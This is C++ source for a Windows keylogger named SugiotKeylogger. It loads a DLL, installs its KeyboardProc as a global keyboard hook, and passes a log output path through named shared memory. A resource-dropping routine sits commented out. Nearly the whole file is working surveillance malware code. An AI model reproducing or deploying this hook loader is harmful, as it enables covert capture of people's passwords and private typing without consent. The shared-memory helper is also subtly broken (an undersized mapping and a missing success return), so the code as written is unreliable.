// SugiotKeylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include "resource.h"

bool WriteStringToSharedMemory(const std::wstring& str, const std::wstring& key);

bool ExtractResource(int resourceID, const std::wstring& outputPath)
{
    // Find the resource
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hRes) return false;

    // Load the resource
    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (!hResLoad) return false;

    // Lock the resource
    LPVOID pResLock = LockResource(hResLoad);
    if (!pResLock) return false;

    // Get the size of the resource
    DWORD resSize = SizeofResource(NULL, hRes);

    // Write the resource to a file
    std::ofstream outputFile(outputPath, std::ios::binary);
    if (!outputFile) return false;

    outputFile.write(static_cast<const char*>(pResLock), resSize);
    outputFile.close();

    return true;
}



BOOL FileExists(LPCWSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
HHOOK hHook;
HOOKPROC KeyboardProc;


BOOL LoadHookingDll(const std::wstring& dllPath) {
    HINSTANCE hinstDLL = LoadLibrary(dllPath.c_str());
    if (hinstDLL != NULL) {
        KeyboardProc = (HOOKPROC)GetProcAddress(hinstDLL, "KeyboardProc");
        if (KeyboardProc != NULL) {
            hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, hinstDLL, 0);
            if (hHook != NULL) {
                FreeLibrary(hinstDLL);
                return TRUE;
            }
            else {
                std::cerr << "Failed to set hook." << std::endl;
                FreeLibrary(hinstDLL);
                return FALSE;
            }
        }
        else {
            std::cerr << "Failed to find KeyboardProc function in the DLL." << std::endl;
            FreeLibrary(hinstDLL);
            return FALSE;
        }
    }
    else {
        std::cerr << "Failed to load the DLL." << std::endl;
        return FALSE;;
    }
}

std::wstring GetExecutablePath() {
    wchar_t buffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

std::wstring GetFullPath(const std::wstring& fileName) {
    std::wstring executablePath = GetExecutablePath();
    std::wstringstream fullPath;
    fullPath << executablePath << L"\\" << fileName;
    return fullPath.str();
}

int wmain(int argc, wchar_t* argv[])
{

    if(argc < 2){
		std::wcout << L"Usage: " << argv[0] << L" <resourceID> <outputPath> " << argc << std::endl;
        getchar();
		return 1;
	}
   
    const std::wstring outPutPath = argv[1];
    const std::wstring dllDroper = GetFullPath(L"Functionality.dll");
    std::wcout << dllDroper << std::endl;
    /*
    if (ExtractResource(IDR_RCDATA1, dllDroper)) {
        std::wcout << L"Resource extracted to " << dllDroper << std::endl;
    }
    else {
        std::cerr << "Failed to extract resource." << std::endl;
        return 1;
    }
    */
    WriteStringToSharedMemory(outPutPath, L"MySharedMemory");
    if (LoadHookingDll(dllDroper)) {
        std::wcout << L"Hook loaded successfully." << std::endl;
    }

    else {
        std::cerr << "Failed to load the hook." << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

bool WriteStringToSharedMemory(const std::wstring& str, const std::wstring& key) {

    // Allocate shared memory
    HANDLE hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(int), key.c_str());
    if (hMapFile == NULL) {
        // Handle error
        return 1;
    }

    // Write data to shared memory
    wchar_t* pData = (wchar_t*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(wchar_t) * 14);
    if (pData == NULL) {
        // Handle error
        CloseHandle(hMapFile);
        return 1;
    }
    wcscpy_s(pData, str.size() + 1, str.c_str());
}